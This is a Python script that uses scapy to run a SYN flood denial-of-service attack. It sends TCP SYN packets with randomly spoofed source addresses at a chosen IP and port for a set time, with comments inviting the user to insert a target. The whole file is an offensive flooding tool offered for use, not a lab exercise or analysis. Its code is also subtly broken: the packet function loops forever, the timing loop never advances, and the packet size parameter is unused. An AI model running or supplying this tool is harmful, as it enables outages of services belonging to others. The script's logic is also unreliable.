from scapy.all import *
import time
import random

def syn_flood(target_ip, target_port, duration, num_packet, packet_size):
    # Craft a SYN packet with random source IP and port
    def craft_packet():
        while True:
            src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(packet, verbose=0)

    # Amplification factor to increase the impact
    amplification_factor = 10  # Increase if needed

    # Attack for the specified duration
    start_time = time.time()
    while time.time() - start_time < duration:
        # Send packets at a faster rate to increase the impact
        for _ in range(num_packet * amplification_factor):
            craft_packet()
        time.sleep(0.1)  # Adjust sleep time as needed to control packet rate

if __name__ == "__main__":
    # Example usage
    target_ip = "192.168.100.112"     # Replace with your target IP
    target_port = 80                  # Replace with your target port
    duration = 700                    # Duration of the attack in seconds
    num_packet = 2000                 # Number of packets to send concurrently
    packet_size = 2000               # Size of the packet in bytes

    syn_flood(target_ip, target_port, duration, num_packet, packet_size)
